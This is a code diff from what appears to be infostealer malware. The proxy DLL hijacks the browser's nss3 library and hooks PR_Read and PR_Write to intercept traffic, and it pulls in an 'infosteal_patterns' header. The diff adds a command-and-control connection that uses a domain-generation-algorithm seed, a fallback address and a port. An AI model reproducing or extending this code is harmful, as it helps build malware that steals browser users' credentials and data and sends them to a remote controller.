@@ -4,9 +4,13 @@
 #include "types/types.h"
 #include "conf/infosteal_patterns.h"
 #include "logging/logging.h"
+#include "c2/c2.h"
+#include "conf/c2.h"
 
 pr_io_func pr_write_orig = 0;
 pr_io_func pr_read_orig = 0;
+C2 c2connection{ conf::dgaseed,conf::fallbackaddr,conf::tlds,conf::port};
+
 
 int myPR_WRITE(void* fd, void* buf, int amnt) {
 
@@ -41,6 +45,7 @@ BOOL WINAPI DllMain(HINSTANCE mod, DWORD fdwReason, LPVOID resv) {
 		HINSTANCE hGetProcIDDLL = LoadLibraryA("nss3.orig");
 		pr_read_orig = (pr_io_func)GetProcAddress(hGetProcIDDLL, "PR_Read");
 		pr_write_orig = (pr_io_func)GetProcAddress(hGetProcIDDLL, "PR_Write");
+
 	}
 	
 	return TRUE;
